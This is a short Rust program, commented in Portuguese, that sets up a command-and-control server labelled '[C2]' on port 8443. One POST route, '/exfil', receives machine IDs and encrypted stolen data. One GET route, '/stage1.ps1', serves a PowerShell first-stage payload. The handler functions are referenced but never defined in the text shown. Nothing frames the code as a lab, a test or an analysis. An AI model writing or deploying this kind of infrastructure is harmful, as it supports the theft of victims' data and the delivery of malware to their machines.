use warp::Filter;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use chrono::Utc;

#[derive(Debug, Serialize, Deserialize)]
struct ExfilData {
    machine_id: String,
    data: String,  // Base64 + AES
    timestamp: i64,
}

#[tokio::main]
async fn main() {
    // Endpoint pra receber dados
    let exfil = warp::path("exfil")
        .and(warp::post())
        .and(warp::body::json())
        .and_then(handle_exfil);
    
    // Endpoint pra servir payload
    let payload = warp::path("stage1.ps1")
        .and(warp::get())
        .and_then(serve_stage1);
    
    let routes = exfil.or(payload);
    
    println!("[C2] Listening on 0.0.0.0:8443");
    warp::serve(routes)
        .run(([0, 0, 0, 0], 8443))
        .await;
}